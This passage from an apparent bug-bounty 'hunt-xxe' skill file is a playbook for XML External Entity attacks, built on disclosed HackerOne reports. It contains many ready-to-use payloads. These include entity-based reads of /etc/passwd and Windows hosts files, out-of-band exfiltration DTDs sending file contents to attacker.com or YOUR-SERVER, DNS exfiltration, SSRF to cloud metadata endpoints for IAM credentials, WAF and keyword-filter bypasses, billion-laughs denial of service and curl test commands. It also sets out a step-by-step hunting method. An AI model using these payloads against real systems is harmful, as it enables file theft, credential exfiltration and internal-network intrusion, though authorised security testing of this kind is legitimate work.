  <!ELEMENT foo ANY>
  <!ENTITY localfile SYSTEM "file:///sys/power/image_size">
  <!ENTITY remotedoc SYSTEM "http://attacker/pocs/?token=xmlsdfgdg5454g54&doc1=2">
]>
<foo>&localfile;&remotedoc;</foo>
```

**Parameter-entity OOB ping (ownCloud #105980):**
```xml
<?xml version="1.0"?>
<!DOCTYPE a [
  <!ENTITY % select SYSTEM "http://wallarm.tools/ok">
  %select;
]>
<a>wlrm-scnr</a>
```

**Rockstar SVG emblem editor — exfil DTD with `%data;` and ImageMagick quirk (#347139):**
```xml
<!DOCTYPE svg [
  <!ENTITY % outside SYSTEM "http://attacker.com/exfil.dtd">
  %outside;
]>
<svg><defs><pattern id="exploit"><text x="10" y="10"></text></pattern></defs></svg>
<!-- exfil.dtd -->
<!ENTITY % data SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts">
<!ENTITY exfil "%data;">
<!-- ImageMagick double-forward-slash SMB reference in the <rect> fill:
     <rect fill="url(//attacker.com/malicious.svg#exploit)"> -->
```

**Billion-laughs PERSON chain (Pippo JaxbEngine #506791):**
```xml
<?xml version="1.0"?>
<!DOCTYPE PERSON [
  <!ENTITY PERSON "PERSON">
  <!ELEMENT PERSON (#PCDATA)>
  <!ENTITY PERSON1 "&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;">
  <!ENTITY PERSON2 "&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;">
  <!ENTITY PERSON3 "&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;">
  ...
]>
```

### Detection Signals to Watch For

A confirmed XXE OOB interaction usually carries a parser fingerprint in the callback. Real examples from the corpus:

- **Informatica #836877** — collaborator logged `GET /x.dtd HTTP/1.1` with `User-Agent: Java...` and `Host: N.syuj65...burpcollaborator.net` plus `Accept: text/html, image/gif, image/jpeg, *; q=.2`. The Java UA confirmed a Java image parser processed the XMP payload.
- **Semrush #312543** — the external entity was fetched by `"Java/1.8.0_144"` (visible in the attacker web-server log), proving a Java XML processor downloaded the sitemap and resolved the entity.
- **ownCloud #105980** — access log showed `2a01:4f8:... - - [18/Dec/2015:21:11:47 +0300] "GET /ok HTTP/1.0" 200 227 "-"` — the parameter-entity SYSTEM fetch.
- **DuckDuckGo #486732** — the blind payload's external DTD (`http://attacker_host/Blind_xxe`) was requested after the victim visited `https://duckduckgo.com/x.js?u=http://attacker_host/xxe.xml`.

When logging callbacks, use a **unique marker per candidate parameter** and poll 30–120 seconds; several sub-tags from one Collaborator payload are indistinguishable in output, so generate a fresh payload per sink to preserve attribution.

### Source-Code Grep Patterns
```bash
# Java
grep -rn "DocumentBuilder\|SAXParser\|XMLReader\|XMLInputFactory\|TransformerFactory" .
# PHP
grep -rn "simplexml_load_string\|SimpleXMLElement\|DOMDocument\|loadXML" .
# Python
grep -rn "xml.parsers.expat\|fromstring\|lxml\|EntityDeclHandler\|SetParamEntityParsing" .
# Missing hardening
grep -rn "FEATURE_SECURE_PROCESSING\|setExpandEntityReferences\|setFeature.*false" .
```

---

## Common Root Causes

1. **Default parser configurations** — Java `DocumentBuilderFactory`/SAX/DOM/JAXP and PHP `SimpleXMLElement` resolve external entities unless explicitly hardened. This is the root cause in the majority of the corpus (Twitter #248668, Semrush #312543, Informatica #105434/#106797, DoD #227880).

2. **Hidden XML consumption** — developers think they accept JSON or "images," but the backend converts to XML or processes XML containers (OOXML, SVG, JPEG XMP, `.wav`). The Informatica, WordPress, Open-Xchange, and Coinbase cases all hinged on this blindness.

3. **"Fetch-then-parse" trust** — features download a user-supplied sitemap/feed/DTD and hand it to an XML parser with no sanitization (Semrush #312543, Elastic #1156748, Mail.ru #505947, DuckDuckGo #483774).

4. **Allowlist/filter bypass through upload parameters** — `allow_file_type_list` widened to include `html;` (Starbucks #500515), `contentType` changed to `image/svg+xml` (Topcoder #845832), or WAF signature bypass via DTD indirection (DuckDuckGo #486732, QIWI #99279/#433996).

5. **Framework/CVE drift** — known-vulnerable components left unpatched: PeopleSoft CVE-2017-3548 (#710654), Magento CosmicSting, Pippo JaxbEngine (#506791), AEM forms (#1321070).

6. **SAML/SSO library misconfiguration** — SSO integrators assume "the library handles security" while passing attacker-influenced assertions to XXE-enabled parsers (Informatica/Okta #106865).

7. **Copy-paste / unhardened code paths** — no `EntityDeclHandler`, no `SetParamEntityParsing`, no `FEATURE_SECURE_PROCESSING` (Qt #4094236, GitHub Security Lab #1512937).

8. **Shared-backend blast radius** — one vulnerable parser on a shared microservice exposes many domains (Uber #154096, the Informatica fleet, the Mail.ru properties), turning a single bug into fleet-wide compromise.

9. **No entity-expansion limits / no secure-processing flags** — parsers left with default expansion ratios allow internal entity chains to blow up memory (Pippo #506791, Qt `.ts` discovery #4094236, SVG attachment rendering #229980). The Qt report notes the developer grepped both trees for `EntityDeclHandler` and `SetParamEntityParsing` and found "zero hits" — a textbook missing-hardening root cause.

10. **Error messages that reflect parsed content** — in-band XXE often succeeds only because the application echoes parser errors or entity values back to the client. Twitter #248668 returned `/etc/passwd` inside an `<error message="...">`; Informatica #106797 returned a `JAXBException` naming the file. Without that reflection the same parser bug would be blind.

11. **Inconsistent content-type enforcement** — a WAF or front-end validates JSON but the origin accepts `application/xml`, `application/x-www-form-urlencoded` carrying XML, or a mismatched charset. DuckDuckGo #483774/#486732, QIWI #36450, and Informatica #106865/#106797 all exploited the gap between what the edge expects and what the parser accepts.

12. **"Internal-only" trust assumptions** — service-to-service SOAP/XML (PeopleSoft #710654, Apache Hive #742808) is treated as trusted, so the XML parser is left fully entity-enabled; XXE then becomes the pivot that breaks the trust boundary from an external or low-privilege entry point.

---

## Bypass Techniques

### When `DOCTYPE`/`ENTITY` keywords are blacklisted
```xml
<!-- Case variation -->
<!DoCtYpE foo [<!EnTiTy xxe SyStEm "file:///etc/passwd">]>

<!-- UTF-16 encode the entire payload -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- Parameter entity instead of general entity -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe;]>

<!-- Break signatures with comments -->
<!-–- -->DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<!-- Numeric character references in the scheme -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "&#x66;&#x69;&#x6c;&#x65;:///etc/passwd">]>
```

### When `file://` / external fetch is blocked — alternative schemes
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">        <!-- Java -->
<!ENTITY xxe SYSTEM "jar:file:///etc/passwd!/">    <!-- Java -->
<!ENTITY xxe SYSTEM "gopher://internal-service:80/_GET%20/">
<!ENTITY xxe SYSTEM "ftp://attacker/%file;">        <!-- Informatica #105753 exfil -->
```

### When network egress (OOB) is blocked
```xml
<!-- Error-based exfiltration — no outbound needed -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///notexist/%file;'>">
  %eval; %error;
]>

<!-- Local-DTD repurposing (see Payload section) -->
```

### WAF bypasses seen in the corpus
- **DTD indirection + fetch parameter** — host the payload on your server and reference it via the app's URL parameter so the WAF never sees the entities (DuckDuckGo #486732: `x.js?u=http://attacker/xxe.xml`).
- **WAF signature bypass on QIWI** — #99279 and #433996 specifically bypassed WAF `ENTITY` filters.
- **Request smuggling via content type** — payload delivered with `application/x-www-form-urlencoded` still parsed as XML (QIWI #36450, Informatica #106865).

### Upload / content-type bypasses
- Widen `allow_file_type_list` to add `html;`, or delete the parameter entirely (Starbucks #500515).
- Change `contentType` POST parameter to `image/svg+xml` (Topcoder #845832).
- Rename `.svg` to `.jpg` and upload as a logo (Coinbase #104620).
- Inject into a ZIP archive member (`xl/worksheets/sheet1.xml`, `ppt/tableStyles.xml`) rather than a top-level file (Informatica #105434, Open-Xchange #334488).
- Hex-edit an offset inside a binary file (WordPress `.wav` #1095645).

### Encoding / parser-confusion bypasses
- Charset declaration mismatch (`UTF-16`) to evade string-matching filters.
- XML comments between keyword fragments.
- Numeric character references for scheme/host characters.
- `XInclude` (`<xi:include href="..."/>`) when `DOCTYPE` is stripped.
- Unicode normalization / double-encoding (signals `unicode-normalization` 1, `double-encoding` 1 in the corpus).

### Data-exfiltration channel swaps
When one egress channel is filtered, swap the exfil transport while keeping the same parameter-entity indirection:

```xml
<!-- HTTP GET exfil (Elastic #1156748) -->
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://YOURDOMAIN/exfil?%data;'>">

<!-- FTP exfil (Informatica #105753) -->
<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'ftp://mysite/%b;'>">%c;

<!-- DNS-only exfil when outbound HTTP is blocked -->
<!ENTITY % data SYSTEM "file:///etc/hostname">
<!ENTITY % send "<!ENTITY exfil SYSTEM 'http://%data;.attacker.com/'>">
```

- Keep file reads **one line at a time** for newline-sensitive parsers — Elastic #1156748's reporter noted they were "only able to read file that contain one line," so target single-line files (`/etc/hostname`, `/sys/power/image_size`) or wrap with `php://filter/convert.base64-encode/resource=`.

### Reaching internal services through the DOCTYPE SYSTEM identifier
The `SYSTEM` identifier itself is an SSRF primitive; point it at internal HTTP rather than a local file:

```xml
<!-- PeopleSoft internal service creation (DoD #710654, CVE-2017-3548) -->
<!DOCTYPE a PUBLIC "-//B/A/EN" "http://localhost:80/pspc/services/AdminService?method=%21--%3E%3Cns1%3Adeployment+...">

<!-- GCP metadata via Apache Hive xpath_string() (Evernote #742808) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/project-id">]>
```

### Escalation fallbacks
- **XXE → RCE (rare):** PHP `expect://` stream wrapper (attempted in h1-5411 CTF #415202), XSLT script extensions, or Java deserialization chains (Pornhub #142562: `SimpleXMLElement` unserialize → XXE → SSRF/LFI/limited DB commands; Magento CosmicSting XXE → admin crypt key → RCE).
- **XXE → DoS:** billion laughs when file read is patched (#506791, #4094236, #229980).

---

## Gate 0 Validation

Before writing the report, answer all three:

1. **What can the attacker DO right now?**
   - Show actual file contents in the response (`/etc/passwd`, `/sys/power/image_size`, `C:\Windows\System32\Drivers\etc\hosts`, `/etc/hostname`).
   - OR show a confirmed OOB callback **with data** (the exfiltrated file embedded in the URL), not just a bare ping.
   - OR show internal HTTP reached via XXE (GCP metadata JSON, a service created via `AdminService` as in DoD #710654).
   - A bare DNS/HTTP ping with no data (Uber #154096 "ping test," Mail.ru blind avatar #276276/#277341) is real but Low/Medium — do not claim Critical.

2. **What does the victim LOSE?**
   - Name the specific asset: local credentials, DB passwords in app config, `/etc/passwd`, GCP project ID / IAM metadata, PII, internal topology, or a newly created service/admin capability.
   - Quantify the blast radius: single host vs. shared backend exposing many domains (Uber, Informatica, Mail.ru fleets).

3. **Can it be reproduced in 10 minutes from scratch?**
   - One `curl` or Burp Repeater request a triage engineer can run against the live target.
   - For blind cases: your collaborator listener reliably shows the hit (with a unique marker) and, ideally, the exfiltrated data; poll 30–120s.
   - No dependence on flaky timing, one-off tokens, or luck.

**OOB-Or-It-Didn't-Happen for XXE:** blind XXE claims require an out-of-band confirmation (Collaborator/interactsh/canarytoken). An error message that merely echoes your entity name is NOT the parser making an outbound request. Attribute the callback to exactly one parameter/endpoint (fresh payload per candidate) before reporting, and run negative controls.

---

## Real Impact Examples

### Scenario A: Shared Backend — One XXE Endpoint, Many Domains (Uber / Informatica pattern)
A tester found an XML search endpoint on `ubermovement.com/api/search/GeneralSearch` that, via GET→POST + an external SYSTEM entity, caused an HTTP request to an attacker IP (#154096). The same vulnerable XML-processing microservice was reachable through sibling domains (`usuppliers.uber.com` #448598). With a two-stage parameter-entity DTD, the parser could read local files and reach internal endpoints — a single bug with fleet-wide blast radius. **Business impact:** credential/secret exposure and internal service access across multiple production domains from one entry point.

### Scenario B: Document Upload → Local File Read (Informatica / WordPress pattern)
Uploading a crafted `.xlsx` with a DOCTYPE injected into `xl/worksheets/sheet1.xml` caused the import pipeline to return `/etc/passwd` verbatim (#105434). The same class appeared in `.pptx` imports (#334488), JPEG XMP metadata on avatar upload (#836877), and a crafted `.wav` in the WordPress media library on PHP 8 (#1095645). **Business impact:** production filesystem and config secrets exposed through an ordinary upload feature, often with only a standard user/author account.

### Scenario C: XXE as SSRF → Cloud Credentials / Internal Admin (Evernote / DoD pattern)
An unauthenticated Apache Hive database exposed an `xpath_string()` SQL function that parsed attacker XML; a SYSTEM entity reached `http://metadata.google.internal/computeMetadata/v1beta1/project/project-id`, disclosing GCP project metadata (#742808). Separately, a PeopleSoft `PSIGW` connector XXE reached `http://localhost:80/pspc/services/AdminService` and created a new service on the server (#710654, CVE-2017-3548). **Business impact:** XXE used as an internal-network pivot to cloud metadata and unauthenticated admin operations — the classic XXE-to-SSRF-to-compromise chain.

### Scenario D: XML Fetch Feature → Blind OOB Exfiltration (Elastic / Semrush pattern)
The Enterprise Search App Search web crawler parsed attacker-hosted `sitemap.xml` files with a Java XML processor; a parameter-entity chain exfiltrated `/etc/hostname` to the attacker's server (#1156748). Semrush's Site Audit "Enter sitemap URL" feature did the same with an external SYSTEM entity whose callback logged `Java/1.8.0_144` (#312543). **Business impact:** server-side file read and outbound request capability from a feature designed merely to crawl XML.

### Scenario E: WebDAV / SOAP / Autodiscover — Legacy XML Surfaces (Mail.ru / QIWI pattern)
Beyond uploads and APIs, legacy XML protocols remained exploitable years after XXE was well understood. Mail.ru's `webdav.mail.ru` accepted XXE in `PROPFIND`/`PROPPATCH` requests (#758978); QIWI's `send.qiwi.ru/soapserver/` allowed local-file opening (and, absent reflection, a `/dev/random` DoS) through SOAP XXE (#36450); Mail.ru's Exchange Autodiscover parser accepted a combined local-file + remote-entity body (#315837). **Business impact:** internet-facing legacy endpoints give unauthenticated file read or DoS, and these surfaces are frequently missed by modern JSON-focused security testing.

### Scenario F: XXE → Deserialization → RCE chain (Pornhub / Magento pattern)
Pornhub's `ams.upload.pornhub.com` exposed a `SimpleXMLElement` serialization error that the researcher turned into object injection through the `callbackUrl` parameter, yielding SSRF, local file inclusion, and limited database commands (#142562). The Magento "CosmicSting" (CVE-2024-34102) chain went further: a nested REST JSON body reached `simplexml_load_string`, an external DTD read `app/etc/env.php` (the admin crypt key), the key forged an admin token, and that led to RCE. **Business impact:** XXE as the first hop in a multi-stage chain that escalates from unauthenticated XML parsing to full application or host compromise — the highest-severity outcome in the corpus.

---

## Disclosed Report Citations (30, all IDs verified in study pack / TOPXXE.md)

1. **Starbucks — XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx** ([H1 #500515](https://hackerone.com/reports/500515)) — file-upload XXE via widened `allow_file_type_list`, stored/XSS, filter bypass, 2019 (CVSS 10.0 Critical).
2. **Mail.ru — XXE on pulse.mail.ru (RSS/Atom feed parsing)** ([H1 #505947](https://hackerone.com/reports/505947)) — direct in-band file-read XXE in RSS/Atom ingestion, 2019 — $6,000.
3. **X / xAI (Twitter) — XXE on sms-be-vip.twitter.com in SXMP Processor** ([H1 #248668](https://hackerone.com/reports/248668)) — SOAP/SXMP XXE, error-based file read via `file:///etc/passwd` reflected in `<error>`, 2017 (Medium CVSS 5.3).
4. **DuckDuckGo — XXE on https://duckduckgo.com (`x.js` u parameter)** ([H1 #483774](https://hackerone.com/reports/483774)) — JS-source-review XXE, world-readable file leak via `u=`, 2019 (Critical).
5. **DuckDuckGo — Partial bypass of #483774 with Blind XXE** ([H1 #486732](https://hackerone.com/reports/486732)) — blind OOB XXE via attacker-hosted DTD + external entity, WAF/fix bypass, also `api.duckduckgo.com`, 2019 (High).
6. **Informatica — XXE through XMP metadata of a JPEG file** ([H1 #836877](https://hackerone.com/reports/836877)) — image-processing XXE, external-DTD in avatar JPEG XMP, Java UA callback, cloud-metadata, 2020 (Critical).
7. **Semrush — XXE in Site Audit function exposing file and directory contents** ([H1 #312543](https://hackerone.com/reports/312543)) — sitemap.xml XXE/SSRF via Java XML processor, callback `Java/1.8.0_144`, 2018 (Critical).
8. **Informatica — [rev-app.informatica.com] XXE** ([H1 #105434](https://hackerone.com/reports/105434)) — XLSX/OOXML XXE, DOCTYPE in `xl/worksheets/sheet1.xml`, `/etc/passwd` file read, 2015 (High).
9. **WordPress — Authenticated XXE** ([H1 #1095645](https://hackerone.com/reports/1095645)) — crafted `.wav` upload on PHP 8, external-DTD file read / SSRF / DoS, 2021 (Medium).
10. **U.S. Dept Of Defense — [HTA2] XXE via SpellCheck Endpoint** ([H1 #715949](https://hackerone.com/reports/715949)) — full-read XXE in `RapidSpellHelpFile.aspx`, Windows hosts file, authenticated cookies, 2019 (CVSS 9.1).
11. **drchrono — XML Parser Bug: XXE over which leads to RCE** ([H1 #55431](https://hackerone.com/reports/55431)) — C-CDA XML upload XXE, `/etc/passwd` disclosure via "Update patient (via C-CDA XML)", 2015.
12. **Evernote — Non-production Open Database In Combination With XXE Leads To SSRF** ([H1 #742808](https://hackerone.com/reports/742808)) — Apache Hive `xpath_string()` XXE → GCP metadata SSRF, 2019 (Critical).
13. **Informatica — [app.informaticaondemand.com] XXE** ([H1 #105753](https://hackerone.com/reports/105753)) — parameter-entity XXE with FTP exfiltration of `/etc/passwd`, 2015 (High).
14. **U.S. Dept Of Defense — XML External Entity (XXE) Injection** ([H1 #2573567](https://hackerone.com/reports/2573567)) — cert-enrollment `/ca/rest/certrequests` SYSTEM file read, 2024 (High).
15. **Lab45 / Topcoder — SVG file upload leads to XML injection** ([H1 #845832](https://hackerone.com/reports/845832)) — SVG avatar upload XXE via `contentType=image/svg+xml` + preSignedURL, 2020 (Low).
16. **Informatica — [marketplace.informatica.com] XXE** ([H1 #106797](https://hackerone.com/reports/106797)) — JSON-to-XML content-type swap, error-based file read (`JAXBException`), 2015 (High).
17. **Elastic — XXE in Enterprise Search's App Search web crawler** ([H1 #1156748](https://hackerone.com/reports/1156748)) — sitemap parsing XXE, parameter-entity OOB exfil of `/etc/hostname`, 2021 (CVSS 9.1).
18. **U.S. Dept Of Defense — XXE with RCE potential (CVE-2017-3548)** ([H1 #710654](https://hackerone.com/reports/710654)) — PeopleSoft `PSIGW` XXE → internal `AdminService` SSRF, created a new service, 2019 (High).
19. **Coinbase — XXE in OAuth2 Applications gallery profile App logo** ([H1 #104620](https://hackerone.com/reports/104620)) — SVG logo XXE renamed to `.jpg`, OAuth2 surface, 2015.
20. **Central Security Project — Pippo XML Entity Expansion (Billion Laughs Attack)** ([H1 #506791](https://hackerone.com/reports/506791)) — JAXB engine entity-expansion DoS via internal entity chains, 2019 (CVSS 8.3).
21. **Informatica — [rev-app.informatica.com] XXE via SAML** ([H1 #106865](https://hackerone.com/reports/106865)) — SAML/SSO XXE in `POST /sso` via Okta, 2016 (High).
22. **Mail.ru — XXE and SSRF on webmaster.mail.ru** ([H1 #12583](https://hackerone.com/reports/12583)) — metadata-fetcher XXE/SSRF, 2014 — $700.
23. **Mail.ru — blind XXE in autodiscover parser** ([H1 #315837](https://hackerone.com/reports/315837)) — Exchange Autodiscover XML, combined `file:///sys/power/image_size` + remote doc entity, 2018 — $5,000.
24. **Uber — Blind OOB XXE at ubermovement.com** ([H1 #154096](https://hackerone.com/reports/154096)) — blind OOB XXE in `/api/search/GeneralSearch`, ping + two-stage DTD, 2016 — $500.
25. **Open-Xchange — Blind XXE via Powerpoint files** ([H1 #334488](https://hackerone.com/reports/334488)) — PPTX/OOXML XXE, DOCTYPE in `ppt/tableStyles.xml`, OOB file-enumeration, 2018 — $2,000.
26. **Rockstar Games — LFI and SSRF via XXE in emblem editor** ([H1 #347139](https://hackerone.com/reports/347139)) — SVG emblem→PNG XXE, Windows hosts file read + HTTP responses rendered, 2018 — $1,500.
27. **Pornhub — [RCE] Unserialize to XXE — file disclosure on ams.upload.pornhub.com** ([H1 #142562](https://hackerone.com/reports/142562)) — `SimpleXMLElement` serialization error → object injection via `callbackUrl`, SSRF + LFI, 2016 — $10,000.
28. **GitHub Security Lab — [Python]: CWE-611: XXE** ([H1 #1512937](https://hackerone.com/reports/1512937)) — Python parser XXE sink / CWE-611, 4 upvotes — $1,800.
29. **QIWI — [send.qiwi.ru] Soap-based XXE vulnerability /soapserver/** ([H1 #36450](https://hackerone.com/reports/36450)) — SOAP XXE, local-file open / DoS via `/dev/random`, 2014 — $1,000.
30. **ownCloud — XXE at host vpn.owncloud.com** ([H1 #105980](https://hackerone.com/reports/105980)) — improper parser config, parameter-entity OOB callback (`http://wallarm.tools/ok`), 2015.

---

## Related Skills & Chains

- **`hunt-ssrf`** — XXE becomes SSRF-with-XML-syntax once the parser fetches external entities. Chain primitive: `<!ENTITY % x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/role">` → exfil IMDS creds via parameter-entity DTD → STS AssumeRole. Where direct SSRF is filter-blocked, `gopher://`/`ftp://` via XXE can still reach internal services (Evernote #742808, DoD #710654). Apply the shared OOB-Or-It-Didn't-Happen gate.
- **`hunt-file-upload`** — XXE most often hides inside uploads that quietly parse XML (SVG, DOCX/XLSX/PPTX, JPEG XMP, `.wav`, GPX/KML). Chain primitive: upload SVG/OOXML with a DOCTYPE → OOB file read of `/etc/passwd`, `web.config`, or `.aws/credentials` (Coinbase #104620, Informatica #105434/#836877, WordPress #1095645).
- **`hunt-rce`** — XXE → RCE is rare but real: PHP `expect://` (attempted in #415202), Java XSLT script extensions, and deserialization chains (Pornhub #142562; Magento CosmicSting XXE → admin crypt key → RCE).
- **`hunt-cloud-misconfig`** — XXE as the egress primitive to reach cloud metadata and internal-only endpoints (Evernote → GCP metadata #742808).
- **`security-arsenal`** — Load the XXE payload tree: standard SYSTEM file read, parameter-entity OOB DTD pattern (the `%` indirection that makes blind XXE work), `php://filter/convert.base64-encode/resource=` for binary-safe reads, XInclude when DOCTYPE is blocked, local-DTD repurposing for zero-egress error exfil, and billion-laughs for DoS.
- **`triage-validation`** — Apply the Pre-Severity + Reproducibility + Gate 0 gates. An XXE that only triggers an OOB ping with no data exfil is Low/Medium; Critical requires proof of file read or internal HTTP — show the actual `/etc/passwd` content or the exfiltrated metadata JSON in the report.

### High-Value Chains at a Glance

| Starting primitive | Chain | Representative reports |
|---|---|---|
| In-band file read | read app config → DB creds / API keys → further access | Informatica #105434/#106797, DoD #715949 |
| Blind OOB XXE | parameter-entity DTD → file exfil → credentials | Elastic #1156748, Uber #154096, Informatica #105753 |
| XXE as SSRF | SYSTEM entity → `169.254.169.254` / `metadata.google.internal` → cloud creds | Evernote #742808, Informatica #836877 |
| XXE → internal admin | SYSTEM entity → `localhost` service endpoint → create/modify resource | DoD #710654 (PeopleSoft AdminService) |
| Upload XXE | SVG/OOXML/`.wav`/JPEG XMP → file read or OOB | Coinbase #104620, Open-Xchange #334488, WordPress #1095645, Informatica #836877 |
| XXE → deserialization → RCE | `SimpleXMLElement` / nested `simplexml_load_string` → admin key → RCE | Pornhub #142562, Magento CosmicSting |
| Entity expansion | billion laughs → DoS when file read is patched | Pippo #506791, Qt #4094236, SVG #229980 |
| Shared backend | one XXE endpoint → all sibling domains | Uber #154096/#448598, Informatica fleet, Mail.ru properties |

**Final reminder:** every blind XXE claim in this corpus that paid as a real finding carried either (a) reflected file content, (b) an OOB callback with exfiltrated data, or (c) a demonstrable internal-service interaction. A bare "the parser made a DNS request" without data or reach is a Low — escalate or do not over-report.


---

## Merged Source Knowledge

This section consolidates **147 unique knowledge blocks** from 4 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (161 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/hunt-xxe/SKILL.md`

## Crown Jewel Targets

XXE is a critical-severity vulnerability that consistently pays at the top of bug bounty scales ($5,000–$30,000+) due to its direct path to sensitive data exfiltration and SSRF. Highest-value targets:

- **Large enterprise platforms** with XML-heavy backend integrations (finance, logistics, ride-sharing APIs)
- **Domains with file-read capability** — `/etc/passwd`, `/etc/shadow`, internal config files, AWS metadata endpoints
- **Subdomains sharing backend infrastructure** — one XXE endpoint can pivot to internal services across dozens of domains (as demonstrated by 26+ Uber domains via a single entry point)
- **API gateways** accepting XML content types — especially REST APIs that silently accept `Content-Type: application/xml`
- **File upload features** — SVG, DOCX, XLSX, PDF, PPTX parsers on the server side
- **SAML/SSO endpoints** — SAML assertions are XML-based and frequently vulnerable
- **Office/document processing services** — any feature that converts or processes user-supplied documents

---

### URL Patterns
```
/api/v*/xml
/upload
/import
/parse
/convert
/saml/acs
/sso/saml
/feed
/rss
/sitemap
/webdav
/soap/*
/wsdl
/service.asmx
/xmlrpc
/graphql (multipart with XML)
```

### Request/Response Headers
```
Content-Type: application/xml
Content-Type: text/xml
Content-Type: application/soap+xml
Content-Type: multipart/form-data  ← check file upload fields
Accept: application/xml
X-Content-Type-Options: (absent — good sign of loose parsing)
```

### JavaScript Patterns (source recon)
```javascript
// Look for in JS bundles
XMLSerializer
DOMParser
parseFromString
new ActiveXObject("Microsoft.XMLDOM")
$.parseXML(
xml2js
libxmljs
lxml
```

### Tech Stack Signals
- **Java stacks**: Spring, Struts, JAX-WS — default XML parsers (SAX, DOM) are XXE-vulnerable without explicit hardening
- **PHP**: `simplexml_load_string()`, `DOMDocument::loadXML()` — vulnerable by default pre-PHP 8
- **Python**: `lxml`, `xml.etree` (safe by default), `xml.sax` (unsafe)
- **Ruby**: `Nokogiri` older versions, `REXML`
- **Node.js**: `xml2js`, `libxmljs`, `fast-xml-parser` (older versions)
- **WSDL/SOAP services**: Always test — legacy XML parsing virtually guaranteed
- **File parsers**: Apache POI (Java), python-docx, LibreOffice integrations

---

## Step-by-Step Hunting Methodology

1. **Map every XML entry point** — Use Burp Suite passive scanner to flag all requests/responses with XML content types. Also intercept JSON endpoints and manually swap `Content-Type` to `application/xml` with equivalent XML body.

2. **Identify file upload features** — Upload SVG, DOCX, XLSX, and observe if the server processes/renders content. These are often XML under the hood.

3. **Attempt inline XXE (classic file read)** — Replace the XML body with a basic entity test payload targeting `/etc/passwd` or `C:\Windows\win.ini`. Observe if the value is reflected in the response.

4. **If no reflection, pivot to Blind OOB** — Set up an OOB listener (Burp Collaborator, interactsh, or a self-hosted netcat server). Inject an external entity pointing to your callback URL. Confirm DNS/HTTP hit to validate the parser is making outbound connections.

5. **Escalate Blind OOB to file exfiltration** — Use a two-stage payload: first entity loads local file, second entity sends it OOB via HTTP parameter or DNS exfiltration.

6. **Test SSRF pivot** — Point the external entity at internal network addresses (`http://169.254.169.254/latest/meta-data/`, `http://10.0.0.1/`, `http://localhost:8080/admin`). Look for differences in response timing or error messages.

7. **Test all subdomains sharing the same backend** — If one subdomain is vulnerable, enumerate and test all others systematically. Shared backend infrastructure means shared vulnerability.

8. **Test parameter-level injection** — Some endpoints parse only specific XML nodes. Inject entities into every element value, attribute value, and even element names.

9. **Test for error-based exfiltration** — If OOB is blocked, trigger XML parsing errors that include file content in the error message returned to the client.

10. **Document the full impact chain** — Demonstrate: file read → SSRF → internal service access → note which internal domains/IPs are reachable.

---

### Blind OOB — DNS/HTTP Callback
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR.BURPCOLLABORATOR.net/xxe-test">
]>
<root><data>&xxe;</data></root>
```

### Blind OOB — File Exfiltration via Parameter Entity (two-stage)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/evil.dtd">
  %dtd;
]>
<root><data>trigger</data></root>
```

**evil.dtd (hosted on attacker server):**
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
%all;
```

### SSRF via XXE (AWS Metadata)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&ssrf;</data></root>
```

### DOCX/XLSX XXE — Inject into `[Content_Types].xml` or `word/document.xml`
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<Types xmlns="..."><Default Extension="rels" ContentType="&xxe;"/></Types>
```

# Original JSON request
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"user":"test"}'

# Converted to XML for XXE testing
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR.net">]><user>&xxe;</user>'
```

## Common Root Causes

1. **Default parser configurations** — Java's `DocumentBuilderFactory`, PHP's `DOMDocument`, and Python's `lxml` all support external entities by default. Developers use them without reading the security docs.

2. **Framework upgrades without security re-review** — Older versions of Spring, Struts, and similar frameworks enabled XXE by default; developers didn't re-audit XML handling when libraries changed.

3. **Hidden XML consumption** — Developers accept JSON at the API layer but convert to XML internally, or use libraries (Apache POI, python-docx) to process uploads without realizing those formats are XML containers.

4. **Copy-paste code from StackOverflow** — XML parsing examples online rarely include entity disabling. Developers copy minimal working examples straight into production.

5. **SAML/SSO library misconfigurations** — SSO integrations often delegate XML parsing to third-party libraries with XXE enabled; developers assume "library handles security."

6. **Testing gaps on non-primary content types** — QA tests JSON APIs extensively; XML code paths receive minimal security testing because they're secondary or legacy.

